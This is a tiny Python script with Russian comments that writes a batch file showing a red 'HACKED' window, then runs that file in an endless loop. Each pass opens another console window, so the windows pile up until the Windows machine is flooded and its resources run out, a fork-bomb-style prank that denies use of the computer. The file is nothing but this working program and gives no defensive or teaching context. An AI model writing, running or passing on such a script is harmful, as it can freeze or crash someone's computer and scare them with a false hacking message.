import subprocess

bat_code = """@echo off
title HACKED
mode con cols=30 lines=5
color 04
echo =====================
echo      HACKED
echo =====================
pause
"""

# Записываем код в .bat файл
with open("script.bat", "w") as f:
    f.write(bat_code)

# Запускаем .bat файл в новом окне
while True:
    subprocess.run("start script.bat", shell=True)
